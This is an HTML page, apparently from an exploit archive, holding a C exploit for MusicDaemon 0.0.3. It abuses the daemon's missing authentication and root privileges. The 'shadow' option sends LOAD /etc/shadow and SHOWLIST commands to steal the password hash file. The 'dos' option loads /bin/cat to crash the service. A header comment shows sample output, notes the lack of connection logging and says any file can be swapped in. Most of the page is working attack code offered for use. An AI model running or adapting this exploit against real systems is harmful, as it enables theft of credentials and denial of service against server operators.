<html><head><title>MusicDaemon <= 0.0.3 v2 Remote DoS and /etc/shadow Stealer</title></head><pre>/* MusicDaemon &lt;= 0.0.3 v2 Remote /etc/shadow Stealer / DoS 
* Vulnerability discovered by: Tal0n 05-22-04 
* Exploit code by: Tal0n 05-22-04 
* 
* Greets to: atomix, vile, ttl, foxtrot, uberuser, d4rkgr3y, blinded, wsxz, 
* serinth, phreaked, h3x4gr4m, xaxisx, hex, phawnky, brotroxer, xires, 
* bsdaemon, r4t, mal0, drug5t0r3, skilar, lostbyte, peanuter, and over_g 
* 
* MusicDaemon MUST be running as root, which it does by default anyways. 
* Tested on Slackware 9 and Redhat 9, but should work generically since the 
* nature of this vulnerability doesn't require 
* shellcode or return addresses. 
* 
* 
* Client Side View: 
* 
* root@vortex:~/test# ./md-xplv2 127.0.0.1 1234 shadow 
* 
* MusicDaemon &lt;= 0.0.3 Remote /etc/shadow Stealer 
* 
* Connected to 127.0.0.1:1234... 
* Sending exploit data... 
* 
* &lt;*** /etc/shadow file from 127.0.0.1 ***&gt; 
* 
* Hello 
* &lt;snipped for privacy&gt; 
* ...... 
* bin:*:9797:0::::: 
* ftp:*:9797:0::::: 
* sshd:*:9797:0::::: 
* ...... 
* &lt;/snipped for privacy&gt; 
* 
* &lt;*** End /etc/shadow file ***&gt; 
* 
* root@vortex:~/test# 
* 
* Server Side View: 
* 
* root@vortex:~/test/musicdaemon-0.0.3/src# ./musicd -c ../musicd.conf -p  1234 
* Using configuration: ../musicd.conf 
* [Mon May 17 05:26:07 2004] cmd_set() called 
* Binding to port 5555. 
* [Mon May 17 05:26:07 2004] Message for nobody: VALUE: LISTEN-PORT=5555 
* [Mon May 17 05:26:07 2004] cmd_modulescandir() called 
* [Mon May 17 05:26:07 2004] cmd_modulescandir() called Binding to port 1234. 
* [Mon May 17 05:26:11 2004] New connection! 
* [Mon May 17 05:26:11 2004] cmd_load() called 
* [Mon May 17 05:26:13 2004] cmd_show() called 
* [Mon May 17 05:26:20 2004] Client lost. 
* 
* 
* As you can see, it simply makes a connection, sends the commands, and 
* leaves. MusicDaemon doesn't even log that new connection's IPs that I 
* know of. Works very well, eh? :) 
* 
* The vulnerability is in where the is no authenciation for 1. For 2, it 
* will let you &quot;LOAD&quot; any file on the box if you have the correct privledges, 
* and by default, as I said before, it runs as root, unless you change the 
* configuration file to make it run as a different user. 
* 
* After we &quot;LOAD&quot; the /etc/shadow file, we do a &quot;SHOWLIST&quot; so we can grab 
* the contents of the actual file. You can subtitute any file you want in 
* for /etc/shadow, I just coded it to grab it because it being such an 
* important system file if you know what I mean ;). 
* 
* As for the DoS, if you &quot;LOAD&quot; any binary on the system, then use &quot;SHOWLIST&quot;, 
* it will crash music daemon. 
* 
* 
*/ 
  
  
#include &lt;stdio.h&gt; 
#include &lt;stdlib.h&gt; 
#include &lt;sys/types.h&gt; 
#include &lt;sys/socket.h&gt; 
#include &lt;netinet/in.h&gt; 
  
int main(int argc, char *argv[]) { 
  
char buffer[16384]; 
  
char *xpldata1 = &quot;LOAD /etc/shadow\r\n&quot;; 
char *xpldata2 = &quot;SHOWLIST\r\n&quot;; 
char *xpldata3 = &quot;CLEAR\r\n&quot;; 
char *dosdata1 = &quot;LOAD /bin/cat\r\n&quot;; 
char *dosdata2 = &quot;SHOWLIST\r\n&quot;; 
char *dosdata3 = &quot;CLEAR\r\n&quot;; 
  
int len1 = strlen(xpldata1); 
int len2 = strlen(xpldata2); 
int len3 = strlen(xpldata3); 
int len4 = strlen(dosdata1); 
int len5 = strlen(dosdata2); 
int len6 = strlen(dosdata3); 
  
if(argc !=  4) { 
printf(&quot;\nMusicDaemon &lt;= 0.0.3 Remote /etc/shadow 
Stealer / DoS&quot;); 
printf(&quot;\nDiscovered and Coded by: Tal0n 
05-22-04\n&quot;); 
printf(&quot;\nUsage: %s &lt;host&gt; &lt;port&gt; &lt;option&gt;\n&quot;, 
argv[0]); 
printf(&quot;\nOptions:&quot;); 
printf(&quot;\n\t\tshadow - Steal /etc/shadow file&quot;); 
printf(&quot;\n\t\tdos - DoS Music Daemon\n\n&quot;); 
return 0; } 
  
printf(&quot;\nMusicDaemon &lt;= 0.0.3 Remote /etc/shadow 
Stealer / DoS\n\n&quot;); 
  
int sock; 
struct sockaddr_in remote; 
  
remote.sin_family = AF_INET; 
remote.sin_port = htons(atoi(argv[2])); 
remote.sin_addr.s_addr = inet_addr(argv[1]); 
  
if((sock = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0) { 
printf(&quot;\nError: Can't create socket!\n\n&quot;); 
return -1; } 
  
if(connect(sock,(struct sockaddr *)&amp;remote, 
sizeof(struct sockaddr)) &lt; 0) { 
printf(&quot;\nError: Can't connect to %s:%s!\n\n&quot;, 
argv[1], argv[2]); 
return -1; } 
  
printf(&quot;Connected to %s:%s...\n&quot;, argv[1], argv[2]); 
  
if(strcmp(argv[3], &quot;dos&quot;) == 0) { 
  
printf(&quot;Sending DoS data...\n&quot;); 
  
send(sock, dosdata1, len4, 0); 
  
sleep(2); 
  
send(sock, dosdata2, len5, 0); 
  
sleep(2); 
  
send(sock, dosdata3, len6, 0); 
  
printf(&quot;\nTarget %s DoS'd!\n\n&quot;, argv[1]); 
  
return 0; } 
  
if(strcmp(argv[3], &quot;shadow&quot;) == 0) { 
  
printf(&quot;Sending exploit data...\n&quot;); 
  
send(sock, xpldata1, len1, 0); 
  
sleep(2); 
  
send(sock, xpldata2, len2, 0); 
  
sleep(5); 
  
printf(&quot;Done! Grabbing /etc/shadow...\n&quot;); 
  
memset(buffer, 0, sizeof(buffer)); 
read(sock, buffer, sizeof(buffer)); 
  
sleep(2); 
  
printf(&quot;\n&lt;*** /etc/shadow file from %s ***&gt;\n\n&quot;, 
argv[1]); 
printf(&quot;%s&quot;, buffer); 
printf(&quot;\n&lt;*** End /etc/shadow file ***&gt;\n\n&quot;); 
  
send(sock, xpldata3, len3, 0); 
  
sleep(1); 
  
close(sock); 
  
return 0; } 
  
return 0; } 

// milw0rm.com [2004-08-24]</pre></html>